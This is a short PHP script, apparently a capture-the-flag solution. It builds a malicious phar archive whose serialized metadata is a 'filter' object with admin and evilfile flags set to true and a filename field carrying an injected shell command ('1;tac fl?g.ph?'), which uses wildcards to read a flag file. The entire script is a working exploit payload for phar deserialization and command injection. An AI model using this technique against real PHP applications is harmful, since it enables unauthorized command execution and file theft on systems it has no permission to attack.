<?php
    unlink('phar.phar');
    class filter{
        public $filename;
        public $filecontent;
        public $evilfile = true;
        public $admin = true;

        public function __construct($f='',$fn=''){
            $this->filename='1;tac fl?g.ph?';
            $this->filecontent='';
        }

    }
 
    $phar = new Phar('phar.phar');
    $phar->startBuffering();
    $phar->setStub('<?php __HALT_COMPILER();?>');
    $o=new filter();
    $phar->setMetadata($o);
    $phar->addFromString('test.txt','test');
    $phar->stopBuffering();
?>